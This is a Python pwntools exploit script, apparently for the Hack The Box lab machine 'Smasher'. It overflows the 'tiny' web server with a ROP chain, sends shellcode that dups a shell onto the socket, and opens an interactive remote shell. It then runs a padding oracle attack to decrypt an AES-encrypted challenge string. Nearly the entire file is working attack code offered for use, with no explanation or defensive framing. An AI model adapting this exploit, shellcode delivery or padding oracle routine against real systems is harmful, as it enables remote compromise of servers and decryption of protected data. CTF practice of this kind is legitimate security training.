#/usr/bin/env python

import logging
import os
import re
from Crypto.Cipher import AES
from base64 import b64encode, b64decode
from pwn import *
from paddingoracle import BadPaddingException, PaddingOracle
from urllib import quote as urlencode

## Get Shell on Smasher

# Set up context
elf = context.binary = ELF('tiny/tiny', checksec=False)
#HOST, PORT = "127.0.0.1", 1111
HOST, PORT = "10.10.10.89", 1111

# Get addresses
BSS = elf.get_section_by_name(".bss")["sh_addr"]
log.info("BSS address: {:02x}".format(BSS))
read = elf.plt.read
log.info("plt read address: {:02x}".format(read))

# Build Payload
junk =  "A" * 568                  # junk
payload = ''
payload += p64(0x4011dd)  # pop rdi; ret
payload += p64(4)         # socket descriptor
payload += p64(0x4011db)  # pop rsi; pop r15; ret
payload += p64(BSS)       # BSS, to go to rsi
payload += p64(BSS)       # junk for r15
payload += p64(read)      # read
payload += p64(BSS)       # return to shellcode

req = r'GET {}'.format(urlencode(junk + payload))

# Send request
while True:
    r = remote(HOST, PORT)
    r.sendline(req)
    r.sendline('')
    r.recvuntil('File not found', timeout=3)
    r.sendline(asm(shellcraft.amd64.dupsh(4), arch="amd64"))
    r.sendline('whoami')
    who = r.recv()
    if who:
        log.success('Shell on {} as {}'.format(HOST, who))
        break
    log.warn('Failed to get shell. Retrying')
    r.close()

## Shell or AES
if (raw_input("Type 'shell' for shell, anything else to continue\n> ").strip() == 'shell'):                    
    r.interactive()
    sys.exit()

## AES Challenge - padding oracle attack
print("")
log.info('Connecting to 127.0.0.1 1337 for AES challenge')
r.sendline('nc 127.0.0.1 1337')
r.recvuntil('[!] Crack this one: ')
data = r.recvline(keepends = False)
log.info('data: {}'.format(data))

encdata = b64decode(data)
log.info("data is {} bytes long, {} blocks".format(len(encdata), len(encdata)//AES.block_size))
log.info("Attack Buffer:")
print('\n')

class PadBuster(PaddingOracle):
    def __init__(self, pwnsock, **kwargs):
        self.r = pwnsock
        super(PadBuster, self).__init__(**kwargs)

    def oracle(self, data, **kwargs):
        os.write(1, "\x1b[3F")
        print(hexdump(data))
        self.r.recvuntil('Insert ciphertext:')
        self.r.sendline(b64encode(data))
        resp = self.r.recvline()
        if 'Invalid Padding' in resp:
            raise BadPaddingException()
        return

log.info('Starting padding orcale attack')
pb = PadBuster(r)
plaintext = pb.decrypt(encdata, block_size=AES.block_size)             
print('plaintext: {}'.format(plaintext))
r.close()   
